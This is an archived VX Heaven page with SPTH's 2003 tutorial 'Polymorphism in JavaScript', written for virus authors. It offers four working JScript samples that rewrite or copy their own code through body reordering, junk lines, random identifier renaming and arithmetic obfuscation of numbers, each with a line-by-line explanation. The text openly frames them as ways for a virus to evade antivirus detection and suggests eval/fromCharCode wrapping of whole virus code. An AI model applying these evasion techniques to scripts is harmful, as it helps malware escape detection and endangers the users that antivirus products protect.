<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title> SPTH 'Polymorphism in JavaScript' (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content="SPTH"/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, SPTH,Polymorphism in JavaScript, sign, rand, math, number, letter, cont, randomn, file, calc, code, count, names, wrte, trash, newnum"/>
<meta name="Description" content="VX Heaven site is dedicted to providing information about computer viruses (virii) and web space for virus authors and groups"/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"022caea90ffa09a87ee4e69a385acd65cdce7622-1498757964-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vsp02.html"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: right;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="12" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div class="s2"><h1>Polymorphism in JavaScript</h1><p><a href="/lib/?lang=en&amp;author=SPTH"> SPTH</a><br/> <em>http://spth.de.vu/</em><br/> <em>August 2003</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vsp02.html';</script><div class="ci"><a href="/lib/?ci=vsp02">1</a></div>[<a style="" href="/lib/?lang=EN&amp;index=MA#vsp02">Back to index</a>] [<a href="/lib/vsp02.html#disqus_thread">Comments</a>]<br/> 
<ul>
<li><a href="#p0">intro words</a></li>
<li><a href="#p1">Body Moving</a></li>
<li><a href="#p2">Adding Trash</a></li>
<li><a href="#p3">Changing variable and function names</a></li>
<li><a href="#p4">Number calculating</a></li>
<li><a href="#p5">last words</a></li>
</ul>
<h2><a name="p0"></a>intro words</h2>
<p>The history of JavaScript has been started in 1999, when jackie released his JS.Optiz in Line Zer0 #2. That was the first virus of it's kind, which infects .JS files. About two years later, in 2001, T-2000 released the first I-Worm via .JS in Matrix #3 named I-Worm.Dawn and Yello released the first "encrypt" JavaScript virus named JS.3Nokia, which used a VBS-file with the command "replace". Again in 2001, jackie released the first poly engine for JavaScript (it changes the variable names). In 2003, jackie released the first real JS encryption article in rRlf#3 and I made the first JS VCK ever. Today there are about 20 JS-viruses around the world, and beside of these I told you, without any Anti AV technique (neither encryption nor polymorphism).</p>
<p>That was my inspiration in writting this article. I thought it's a bad fact to don't discover good techniques for viruses in a computer language (JavaScript), and I wanted to do something against that. Well, here we are...</p>
<p>As everybody knows, polymorphism is changing the code of the program (virus). When I thought about ways how to manage that, three different came to my mind. First one is "body-moving", second one is "adding trash", third one is "changing var or func names" and last one is "number calculating". OK, blabla... ;) Let's start:</p>
<p>I told you, that I found three techniques. The article includes examles and explanation for every one. The names of the types came from my mind, don't say anything against them. Thanks! :)</p>
<h2><a name="p1"></a>Body Moving</h2>
<p>Maybe the name explanes itself. If not, I'll explan it to you: If you make your virus in the normal way, it has always the same form (command A, command B, command C, ...). Now let's change them to ge an other form. The exaple you will see some lines after that is able to make 24 (4*3*2*1) variants of itself. The explanation you'll find after the code.</p>
<h3>body-moving-example</h3>
<pre class="source">
var fso=alpha()
var fake=doit()
var fake=ranA()
var randa, randb, randc, randd
file.WriteLine("// End")

function alpha()
{
  var import=WScript.CreateObject("Scripting.FileSystemObject")
  return(import)
}

function doit()
{
  file=fso.CreateTextFile("file.js")
  myfile=fso.OpenTextFile(WScript.ScriptFullName, 1)
  for (i=0; i&lt;=5; i++) { code=myfile.ReadLine(); file.WriteLine(code) }
  myfile.Close()
}

function ranA()
{
  for (i=0; i&lt;=25; i++)
  {
    cont="";
    rand=Math.round(Math.random()*3)+1
    if (rand==1) { if (randa!=1) { cont="function alpha()"; count=4; randa=1 } }
    if (rand==2) { if (randb!=1) { cont="function doit()"; count=6; randb=1 } }
    if (rand==3) { if (randc!=1) { cont="function ranA()"; count=12; randc=1 } }
    if (rand==4) { if (randd!=1) { cont="function ranB(cont, count)"; count=16; randd=1 } }
    if (cont!="") { fake=ranB(cont, count) }
  }
}

function ranB(cont, count)
{
  myfile=fso.OpenTextFile(WScript.ScriptFullName, 1)
  code="";
  for (j=0; j&lt;=100; j++)
  {
    if (code!="// End") { code=myfile.ReadLine() }
    if (code==cont)
    {
      for (k=0; k&lt;=count; k++)
      {
        if (code!="// End") { file.WriteLine(code); code=myfile.ReadLine() }
      }
    }
  }
  myfile.Close()
}
// End
</pre>
<p>The only thing the file is doing is to generate a new variant of itself in the current directory with the filename "file.js" Nothing more. You can see four different functions (alpha, doit, ranA, ranB). The file writes this functions in the new file, but in different order.</p>
<h3>explanation of the body-moving sample</h3>
<pre class="source"><b>>> var fso=alpha()</b>
<b>>> var fake=doit()</b>
<b>>> var fake=ranA()</b>
	This 3 lines are something like a call to the different functions.
        For instands first line (fso) calls the alpha-function.

<b>>> var randa, randb, randc, randd</b>
	These four variables we'll use in the ranA-function. And because of the
	fact, that we want to calculate with them, we have to write this line.

<b>>> file.WriteLine("// End")</b>
	The last line, when somebody runs the file. Why the last line? Everything
	else runs in the functions we called above.

<b>>> function alpha()</b>
<b>>> {</b>
<b>>> var alph=WScript.CreateObject("Scripting.FileSystemObject")</b>
<b>>> return(alph)</b>
<b>>> }</b>
	Our first function. As you can see, the variable "import" is the FileSystemObject.
	Then it returns the "import". That means, now the "alpha" (the functionsname) has
	the value of "import". When you're looking in the very first line of the code,
	you will see "var fso=alpha()". That means, "fso=alpha()=beta=the filesystemobject".

<b>>> function doit()</b>
<b>>> {</b>
<b>>> file=fso.CreateTextFile("file.js")</b>
	A new file will be created. After finishing, this file.js includes our code
	in different order.

<b>>> myfile=fso.OpenTextFile(WScript.ScriptFullName, 1)</b>
	We open our code (WScript.ScriptFullName) to read from it (-> 1)

<b>>> for (i=0; i&lt;=5; i++) { code=myfile.ReadLine(); file.WriteLine(code) }</b>
	We read the first five lines from our code and write them to the new file.

<b>>> myfile.Close()</b>
<b>>> }</b>
	And close ourselve.

<b>>> function ranA()</b>
<b>>> {</b>
<b>>> for (i=0; i&lt;=25; i++)</b>
<b>>> {</b>
	Start of the ranA function!
	The next things will run 25times.

<b>>> cont="";</b>
	The variable "cont" is empty, because we have don't want it to be the old content.

<b>>> rand=Math.round(Math.random()*3)+1</b>
	rand is a random number between 1 and 4!

<b>>> if (rand==1) { if (randa!=1) { cont="function alpha()"; count=4; randa=1 } }</b>
	if the random-number we searched in the last line is 1 then the variable cont
	is the value for writing the "alpha-function" to the file. The variable count
	contains the number of the lines, we want to write to the new file.
	randa is 1 because he have to check, if it's already written to the file.

<b>>> if (rand==2) { if (randb!=1) { cont="function doit()"; count=6; randb=1 } }</b>
	The same as the last line: if the random-var-value is 2 then:
	the searching value of "cont" is the the start of "doit-function"
	We want to write the whole function, because of that count=6 (doit has 6lines)
	And set the randb one for avoiding writing the thing again to the file

<b>>> if (rand==3) { if (randc!=1) { cont="function ranA()"; count=12; randc=1 } }</b>
	The same: searching for ranA-function, write 12 lines and set the randc to 1

<b>>> if (rand==4) { if (randd!=1) { cont="function ranB(cont, count)"; count=16; randd=1 } }</b>
	The same again!

<b>>> if (cont!="") { fake=ranB(cont, count) }</b>
	Now we call the ranB function! First we have to heck, if cont&lt;>"", then call the
	function and give it the informations about what we searching for (cont) and how
	much lines we want to write.

<b>>> }</b>
<b>>> }</b>
	End of the "for" and end of the function.

<b>>> function ranB(cont, count)</b>
<b>>> {</b>
	Here the function ranB starts. And as you see above, we're using the to variables
	from ranA function. cont is the value we'll searching for and count is the number
	of lines we're writing to the file.js.

<b>>> myfile=fso.OpenTextFile(WScript.ScriptFullName, 1)</b>
	We open ourselve again to read from it.

<b>>> code="";</b>
	Have to delete the content of the code-variable. Otherwise the program won't work

<b>>> for (j=0; j&lt;=100; j++)</b>
<b>>> {</b>
	Next things will run 100 times

<b>>> if (code!="// End") { code=myfile.ReadLine() }</b>
	First we're checking, if the old content of "code" is "// End". You can see the
	"// End" at the end of the code. If you don't check that, there will be an
	"Read after EOF"-error and we don't want that. OK, is the code isn't "// End", we'll
	read one line from our code.

<b>>> if (code==cont)</b>
<b>>> {</b>
	If the line we read is the line we're searching for (remember the function-name when
	we called this function), the next things will run.

<b>>> for (k=0; k&lt;=count; k++)</b>
<b>>> {</b>
	Next things will run "count"-times. Maybe you remember, that count is the number of lines
	we want to write.

<b>>> if (code!="// End") { file.WriteLine(code); code=myfile.ReadLine() }</b>
	First we're checking once more if the line we read isn't the end of the file.
	If it isn't than we're writing the "code" (line we read before) to the new file and
	read the next line of our code.

<b>>> }</b>
<b>>> }</b>
<b>>> }</b>
<b>>> myfile.Close()</b>
<b>>> }</b>
<b>>> // End</b>
	First "for", "if" and second "for" ends, we close our file and the function ends.
	You can see a "// End". It shows the program the end of the file, to don't get the
	error i explaned before.
</pre>
<h2><a name="p2"></a>Adding Trash</h2>
<p>Adding trash is another nice thing to make it harder to detect the virus. A short explanation of it: You add some junk comments to the file, which don't let the program show any error. The example file (you'll find it some lines after this) includes new variables and "comments" (double-slash [//]) to the new file. The variables don't do anything, and also the comments don't do anything. A nice fact while using this techinque is, that the file has every generation an other size. Note: It's important, that you don't add the trash into next generation, because the code will be bigger and bigger. Now let's have a look at the example. You'll find an explanation of the code after it.</p>
<h3>adding-trash-example</h3>
<pre class="source">
 var fso=WScript.CreateObject("Scripting.FileSystemObject")
file=fso.CreateTextFile("file.js")
myfile=fso.OpenTextFile(WScript.ScriptFullName, 1)
for (i=0; i&lt;=100; i++)
{
  code=myfile.ReadLine()
  if (code=="// End") { i=666; }
  codesn=String.fromCharCode(code.charCodeAt(0))
  if (codesn!="/" &amp;&amp; codesn != "v")
  { 
    if (Math.round(Math.random()*3)+1==2)
    {
      rand=Math.round(Math.random()*2)+1 
      if (rand==1) { file.WriteLine("var "+namegen()+"="+unescape("%22")+namegen()+namegen()+unescape("%22")) }
      if (rand==2) { file.WriteLine("// "+namegen()) }
      if (rand==3) { file.WriteLine("var "+namegen()+"="+Math.round(Math.random()*9999999)) }
    }
    file.WriteLine(code)
  }
}
file.WriteLine("// End")

function namegen()
{
  var name=""
  for (j=0; j&lt;=Math.round(Math.random()*15); j++) 
  {
    name=name+unescape("%"+(Math.round(Math.random()*18)+61)) 
  }
  return(name)
}
// End
</pre>
<p>Once more the example makes a new generation of itself in the current directory with the filename "file.js". Noting more. Now let's explain the lines of code.</p>
<h3>explanation of the adding-trash sample</h3>
<pre class="source"><b>>>  var fso=WScript.CreateObject("Scripting.FileSystemObject")</b>
	Now the variable "fso" is the FileSystemObject. Important note:
	Infront of the real code is a space. That's important, otherwise
	the program "thinks", that's also a trash-code and don't write it
	to next generation and the program won't work anymore.

<b>>> file=fso.CreateTextFile("file.js")</b>
<b>>> myfile=fso.OpenTextFile(WScript.ScriptFullName, 1)</b>
	Here we're generating a new file (file.js - it should be our new file) and
	opening our file to read from it.

<b>>> for (i=0; i&lt;=100; i++)</b>
<b>>> {</b>
	Next things will be run 100 times (for every line one time, but you know,
	we added also trash-lines of code. Because of that 100 times.

<b>>> code=myfile.ReadLine()</b>
	Read one line of our file and save it to variable "code".

<b>>> if (code=="// End") { i=666; }</b>
	In the end of the code you'll see a mark "// End". Now we're checking if the
	code is this mark (If yes, we're at the end of the code and have to stop reading:
	so we set the counter (variable "i") to 666. (101 would also work, but I thought,
	666 is better :D )

<b>>> codesn=String.fromCharCode(code.charCodeAt(0))</b>
	Now code is the first sign of the variable "code". (this line is from jackie's
	"don't hide, come out! (jscript encryption, a humble approach)". Thanks!) Why we
	need the first sign of "code"? Because we have to check, if it's a normal line
	or a trash-line.

<b>>> if (codesn!="/" &amp;&amp; codesn != "v")</b>
<b>>> { </b>
	I tod you, that "codesn" is the first sign of "code". Now we check, if it isn't
	"/" or "v" (this lines are trash lines). If it isn't so, the program will run next
	lines.

<b>>> if (Math.round(Math.random()*3)+1==2)</b>
<b>>> {</b>
	We don't want to add a trash line to every line, because of that we have to use 
	a random number to check, if it should be written. If the random number we're
	searching for is two, we'll add trash ( we'll run next lines)

<b>>> rand=Math.round(Math.random()*2)+1 </b>
	Again a random-number. Now we check, which one of the three trash types we'll write.

<b>>> if (rand==1) { file.WriteLine("var "+namegen()+"="+unescape("%22")+namegen()+namegen()+unescape("%22")) }</b>
	Type one: It writes something like [var hbsdfhish="ksjdfhhfskdjhfhksdjfuo"] to the file.
	You may wonder what "namegen()" means. That's some random-signs generated by the
	function "namegen". You'll find it some lines after that code.
	
<b>>> if (rand==2) { file.WriteLine("// "+namegen()) }</b>
	Type two: it writes something like [// jowkcnan] to the file.

<b>>> if (rand==3) { file.WriteLine("var "+namegen()+"="+Math.round(Math.random()*9999999)) }</b>
	Type three: It writes something like [var jdiqpk=5482758] to the file.

<b>>> }</b>
<b>>> file.WriteLine(code)</b>
<b>>> }</b>
<b>>> }</b>
<b>>> file.WriteLine("// End")</b>
	End of the first if. Than we're writing the code we already read from our code to
	the file. Then the Second "if" and the "for" ends. In the of the new file we're
	writing a "// End", because we've to know, that here the code ends. If you think, we
	already write this to the code: No, remember, we don't write anything beginning with "/"

<b>>> function namegen()</b>
<b>>> {</b>
	Function "namegen" starts. Here we'll make our random names.

<b>>>   var name=""</b>
	Important line. If we don't write it, there will be an error.

<b>>> for (j=0; j&lt;=Math.round(Math.random()*15); j++) </b>
<b>>> {</b>
	Next things will run [1-15] times. Why that? Because we want a random size of the
	new variable.

<b>>> name=name+unescape("%"+(Math.round(Math.random()*18)+61)) </b>
	Here we'll make the random variable. It's called "name" and will contain only lowercase
	letters. You can see the [unescape("%"+random-number)]. That's something like "chr(...)"
	in VB.

<b>>> }</b>
<b>>> return(name)</b>
<b>>> }</b>
<b>>> // End</b>
	The "for" ends. Then we return the variable "name". Now we can use it, when we call "namegen()"
	After this the function ends. And last line, as I told about 100 times, is the "// End", which
	shows us the End Of File.
</pre>
<h2><a name="p3"></a>Changing variable and function names</h2>
<p>Changing the variable names is an other nice technique, and maybe the most successfully of all. A shourt explanation: Most JavaScripts uses much variables (like a variable for the FileSystemObject or something like that) or functions to make the code smaller. Variables or functions don't need to have a static name, that means, you can change them. That's the prinzip of the next example. Changing these names means very hard detection of the virus by AVs. OK, now let's have a look at the example.</p>
<h3>changing-names example</h3>
<pre class="source">
var fso=WScript.CreateObject("Scripting.FileSystemObject")
myfile=fso.OpenTextFile(WScript.ScriptFullName,1)
mycode=myfile.ReadAll()
myfile.Close()

file=fso.CreateTextFile("newvir.js")
file.Write(mycode+String.fromCharCode(47)+String.fromCharCode(47))
file.close()

for (l=0; l&lt;10; l++)
{
  code=changeit(l)
  file=fso.OpenTextFile("newvir.js",2)
  file.Write(code+String.fromCharCode(47))
  file.Close()
}

function changeit(i)
{
  var code=""; wrte="";
  var changevars=new Array("fso", "changeit", "myfile", "mycode", "file", "wrte", "randname", "namegen", "check", "code", "changevars")
  myfile=fso.OpenTextFile("newvir.js",1)
  randname=namegen()
  for (k=0; k&lt;2500; k++)
  {
    check=1;
    if (wrte!=String.fromCharCode(47))
    { 
      wrte=myfile.Read(1)
      if (wrte==changevars[i].substring(0,1))
      {
        for (m=1; m&lt;changevars[i].length; m++)
        {
         wrte+=myfile.Read(1)
         if (wrte!=changevars[i].substring(0,m+1)) { m=666 }
        }
        if (wrte==changevars[i]) { code+=randname; check=0; }
      }
      if (check) { code+=wrte }
    }
  }
  return(code)
}

function namegen()
{
  var randomn=""
  for (j=0; j&lt;=Math.round(Math.random()*15)+5; j++) { randomn+=unescape("%"+(Math.round(Math.random()*18)+61)) }
  return(randomn)
}
//
</pre>
<p>As you can see, the examle uses a array with all the variable names, which have to be changed. Than it searchs in every letter for the start of the variable-name, that it should change. If there's no variable, it copies the letter to "code". Else it copies a new random name to the "code". This new letter is the new variable or function name. Now I'm going to explain you every line.</p>
<h3>explanation of the changing-names sample</h3>
<pre class="source"><b>>> var fso=WScript.CreateObject("Scripting.FileSystemObject")</b>
<b>>> myfile=fso.OpenTextFile(WScript.ScriptFullName,1)</b>
<b>>> mycode=myfile.ReadAll()</b>
<b>>> myfile.Close()</b>
	First line means, that "fso" is the FileSystemObject. Than we open ourselve,
	read everything from it and close ourselve. As you can see, "mycode" is the
	whole content of our file.

<b>>> file=fso.CreateTextFile("newvir.js")</b>
<b>>> file.Write(mycode+String.fromCharCode(47)+String.fromCharCode(47))</b>
<b>>> file.close()</b>
	We're createing a new file named "newvir.js" and write our code+"//" to it
	The "String.fromCharCode(...)" is something like "chr$(...)" in VB.
	And the ASCII from "47" is "/". After doing that, we close the file.

<b>>> for (l=0; l&lt;10; l++)</b>
<b>>> {</b>
	The next things runs 11 times (10+"0"=11), because we have to change 11 variables.

<b>>> code=changeit(l)</b>
	We call the function "changeit" and give it the value "l". That's the
	counter of this "for". (1.run:0; 2.run:1; 3.run:2; ...). The "return-value"
	of the function will be copy to "code".

<b>>> file=fso.OpenTextFile("newvir.js",2)</b>
<b>>> file.Write(code+String.fromCharCode(47))</b>
<b>>> file.Close()</b>
<b>>> }</b>
	We open the "newvir.js" again to write (2). We write the "code" and a "/" to the
	file and close it. Than the "for" ends.

<b>>> function changeit(i)</b>
<b>>> {</b>
	You can see: Here is the start of the "changeit"-function.

<b>>> var code=""; wrte="";</b>
	We set the value of the variables "code" and "wrte" to nothing. If we don't do that,
	the whole code won't work.

<b>>> var changevars=new Array("fso", "changeit", "myfile", "mycode", "file", "wrte", "randname", "namegen", "check", "code", "changevars")</b>
	That's the array with all the variable-names, which have to be changed. As you can see,
	there are 11 ones.

<b>>> myfile=fso.OpenTextFile("newvir.js",1)</b>
	We open the "newvir.js" to read from it. This file contains our whole code

<b>>> randname=namegen()</b>
	Now the variable "randname" is the value of the return from "namegen"-function. That value is
	a random name with 5 to 20 letters. We have to save that value, otherwise every variable we
	wanna change has an other name. (for instands: 1.fso: kgfoqm, 2.fso: oemvhqp, ...)

<b>>> for (k=0; k&lt;2500; k++)</b>
<b>>> {</b>
       	Next things will run 2500 times (because the size of the code - you have to know, that ever
	variable could be 20 bytes).

<b>>> check=1;</b>
	"check" is a variable which tells us, if we've already written a piece of code to the file.
	Value 1: We have to write, Value 2: We did.

<b>>> if (wrte!=String.fromCharCode(47))</b>
<b>>> {</b>
	We check, if we read a "/". If yes, we're at the end of the file. If it's not, the next things
	run.

<b>>> wrte=myfile.Read(1)</b>
	"wrte" is one byte of our code.

<b>>> if (wrte==changevars[i].substring(0,1))</b>
<b>>> {</b>
	We check, if "wrte" is the first byte of the variable we're searching for at the moment.
	If yes, we do the other things too.

<b>>> for (m=1; m&lt;changevars[i].length; m++)</b>
<b>>> {</b>
	We'll repeat the next lines as often as the variable we're searching for is long. m=1 because 
	we already read one byte.

<b>>> wrte+=myfile.Read(1)</b>
	Now we read one more byte and add it to the variable wrte.

<b>>> if (wrte!=changevars[i].substring(0,m+1)) { m=666 }</b>
	If the numbers of bytes, which we read, is not the part of the variable, which we're searching
	for, then we stop the "for". Let's set "m" to 666. The for runs as often as the size of the 
	variable, which we are searching for. And the biggest size of a variable is 20 (5+15). So we stop
	it in an easy way.

<b>>> }</b>
<b>>> if (wrte==changevars[i]) { code+=randname; check=0; }</b>
	End of the first "for". Next line: if the things we read from the file is the same as the variable
	we are searching for, then we'll add the new variable to the code and set check to zero, because we
	already added it.

<b>>> }</b>
<b>>> if (check) { code+=wrte }</b>
	End of an "if". Now we check, if we added the things from reading to "code" or not. if not, then
	we'll add it.

<b>>> }</b>
<b>>> }</b>
<b>>> return(code)</b>
<b>>> }</b>
	End of the "if" and end of the "for". Now we return the "code" to the main program. Now the 
	main program can use "code" via "changeit()". (That's the name of the currents function. And 
	the function "changeit" ends.

<b>>> function namegen()</b>
<b>>> {</b>
	The function "namegen" starts.

<b>>> var randomn=""</b>
	We have to set "randomn" to nothing, otherwise the program won't work.

<b>>> for (j=0; j&lt;=Math.round(Math.random()*15)+5; j++) { randomn+=unescape("%"+(Math.round(Math.random()*18)+61)) }</b>
	That's an important line. It searchs for a random name. The variable "randomn" is a random 
	name with [5..20] letters.

<b>>> return(randomn)</b>
<b>>> }</b>
	We return this random name to the main program and close the function "namegen"

<b>>> //</b>
	Here you can see the "//". This tells our program, that there is the end of the
	whole code, and we don't have to read anymore.
</pre>
<h2><a name="p4"></a>Number calculating</h2>
<p>This technique came to my mind while I was trying to include the three other techniques in one virus. It's a quite good technique to fake AVs because they have to calculate with all the numbers. If they do so, it will use fucking much time. The main idea behind this script is, that [1]=[2-1]=[4*2-7]=[33/11*2/6] ... I guess, you know what I mean. OK, now let's have a look at the code.</p>
<h3>number-calculating-example</h3>
<pre class="source">
var fso=WScript.CreateObject('Scripting.FileSystemObject'); code='';
fileall=fso.OpenTextFile(WScript.ScriptFullName,1).ReadAll()
file=fso.OpenTextFile(WScript.ScriptFullName,1)
for (i=1; i&lt;fileall.length; i++) 
{
  sign=file.Read(1)
  checka=1;
  if (sign.charCodeAt(0)>47 &amp;&amp; sign.charCodeAt(0)&lt;58)
  {
    checka=0; findfullnumber(sign)
  }
  if (checka) { code+=sign; }
}
file.Close()
WScript.Echo(code)
file=fso.OpenTextFile(WScript.ScriptFullName,2)
file.Write(code+'}')
file.Close()

function findfullnumber(sign)
{
  number=sign;
  for (j=i; j&lt;fileall.length; j++)
  {
    check=1; sign=file.Read(1); i++;
    if (sign.charCodeAt(0)>47&amp;&amp; sign.charCodeAt(0)&lt;58 || sign=='.') { number+=sign; check=0;}
    if (check==1) { j=fileall.length }
  }
  calc=Math.round(Math.random()*2)+1;
  rand=Math.round(Math.random()*10)+1; 
  if (calc==1) { newnum='('+(number-rand)+'+'+rand+')' }
  if (calc==2) { newnum='('+(number/1+rand)+'-'+rand+')' }
  if (calc==3) { newnum='('+(number*rand)+'/'+rand+')' } 
  code+=newnum+sign;
}
</pre>
<p>This file, while running, change every number to something else. For instands it changes [2] to [3+3/3] or whatever. You have to know, that this code is just a prove of concept and you are able to improve the whole thing. For instands in that way:</p>
<pre class="source">
  ...
  eval(String.fromCharCode([here your whole viruscode in chr]))
  ...
</pre>
<p>You will get tons of numbers, and because of that the above script will be much more successfully. Hmm, ok, now I will explain the lines, so you'll know, what it does.</p>
<h3>explanation of number-calculating-example</h3>
<pre class="source"><b>>> var fso=WScript.CreateObject('Scripting.FileSystemObject'); code='';</b>
<b>>> fileall=fso.OpenTextFile(WScript.ScriptFullName,1).ReadAll()</b>
<b>>> file=fso.OpenTextFile(WScript.ScriptFullName,1)</b>
	We declate 'FileSystemObject', set code to nothing, open the file to read all
	(because we need the length of the file) and open it again, because we want 
	write.

<b>>> for (i=1; i&lt;fileall.length; i++) </b>
<b>>> {</b>
	We do the next things as often as our file is long in bytes. (?!? :D)
<b>>> sign=file.Read(1)</b>
<b>>> checka=1;</b>
	Read one letter from the code and set 'checka' to 1.

<b>>> if (sign.charCodeAt(0)>47 &amp;&amp; sign.charCodeAt(0)&lt;58)</b>
<b>>> {</b>
	Check if the letter we found is a number
<b>>> checka=0; findfullnumber(sign)</b>
<b>>> }</b>
	If yes, checka=0 and we call 'findfullnumber', because the number could have more
	than one sign (for instands: 12). End of the if-part.

<b>>> if (checka) { code+=sign; }</b>
<b>>> }</b>
	If we found no number, we'll add the letter to the variable 'code'. End of the
	for-part

<b>>> file.Close()</b>
<b>>> WScript.Echo(code)</b>
<b>>> file=fso.OpenTextFile(WScript.ScriptFullName,2)</b>
<b>>> file.Write(code+'}')</b>
<b>>> file.Close()</b>
	We close the file with read-access, write a msg-box with the new code, open the
	file again with write-access and write the code +'}' to the file and close it again.
	We need to write '}', because the last letter of the code ('}') won't be added to
	the variable 'code'.

<b>>> function findfullnumber(sign)</b>
<b>>> {</b>
<b>>> number=sign;</b>
	Let's start to search for the whole number. Add sign (the letter, which is a number)
	to 'number'.
<b>>> for (j=i; j&lt;fileall.length; j++)</b>
<b>>> {</b>
	We do the next things as often as our filesize, because the number could have 1000
	signs or more, and I had no better idea to do this. :)

<b>>> check=1; sign=file.Read(1); i++;</b>
	Set 'check' to 1. We read one letter of our file, and increase 'i', otherwise there
	will be a 'read after file-end'-error.

<b>>> if (sign.charCodeAt(0)>47&amp;&amp; sign.charCodeAt(0)&lt;58 || sign=='.') { number+=sign; check=0;}</b>
	Check if the letter we read is a number or a comma. If yes, add the letter to the
	variable, which contains the number. And set check to zero.

<b>>> if (check==1) { j=fileall.length }</b>
<b>>> }</b>
	if check is still one (= number ended) we set the length of our file to j (to
	stop the 'for'-part.

<b>>> calc=Math.round(Math.random()*2)+1;</b>
<b>>> rand=Math.round(Math.random()*10)+1; </b>
	Two random numbers, which we need to generate the new calculation.

<b>>> if (calc==1) { newnum='('+(number-rand)+'+'+rand+')' }</b>
<b>>> if (calc==2) { newnum='('+(number/1+rand)+'-'+rand+')' }</b>
<b>>> if (calc==3) { newnum='('+(number*rand)+'/'+rand+')' } </b>
	Generating the new calculations. You may wonder in line two the '/1'. Windows
	'thinks', that 'number' is a string, because of that it will add 'rand' as string
	and not as number (12+2=122). With this trick we change the string to a number:
	(12+2=14). I added before and after the calculation a '(' and ')' because
	add and dec are 'Level One' calculating-signs, and mul and div are 'Level Two'.

<b>>> code+=newnum+sign;</b>
<b>>> }</b>
	Add the new calculation to code.
</pre>
<h2><a name="p5"></a>last words</h2>
<p>I think, polymophism is the best technique in scripts to avoid detection of AVs. One polymorphic techique is good, two are better and three are the best and now guess, what will be up, if you use four differend polymorphism techniques in one virus. It would be no problem to add all these techniques in one virus. In fact, I think, it would be a big problem for AVs to detect all variants of such a virus.</p>
<p>Now, at the end of the article, I hope that you've enjoyed reading this and you didn't become bored. One important fact I forgot: Please forgive me my grammer or spelling mistakes in this article. English isn't my nativ language and I'm to lazy to learn writing without mistakes. :D At the end I wanna send some greets or thanks messages out to the world:</p>
<pre class="source">
  - SlageHammer          &lt;-- Much thanks for the idea with the JavaScript history :)
  - jackie               &lt;-- Something like a pioneer at JS: Made the first JS infector and the first JS poly engine
  - kefi                 &lt;-- JS-rulez :D
  - SAD1c                &lt;-- Cool JS-encrypter, unfortunatly it doesn't work perfect :)
  - philet0ast3r         &lt;-- Auf Hemp Hover's BAT-VCK source schaun und nix mitbekommen +lol+
  - Disk0rdia            &lt;-- Falls wir uns nochmal treffen will ich ne Revange im Billiard, und du tust schön Tischfussballspielen üben! :)
  - Gigabyte             &lt;-- A feminin virus coder: kewl! hehe...
  - Knowdeth             &lt;-- Metaphase rules, I want to see more from you!
  - VirusBuster          &lt;-- One of the coolest guy I've ever had contact
  - Vorgon               &lt;-- Thanks for the tons of info you gave me in win32asm
  - VorteX               &lt;-- One of the first person helped me with virii things! Where are you??
  - Worf                 &lt;-- For sending me much viruses long time ago. Also the question to you: Where are you?
  - Necronomikon         &lt;-- Glaubst du noch an eine Zer0Gravity #1?
  - prizzy               &lt;-- Very many thanks for writing me that mail!!!
  - SnakeByte            &lt;-- Glaubst du, es ist eine gute Idee, den source des besten VCKs der Welt verrecken zu lassen? :D
  - herm1t               &lt;-- For hosting me...
  - Doctor Rave          &lt;-- Vielen dank für alles, wast für mich getan hast!
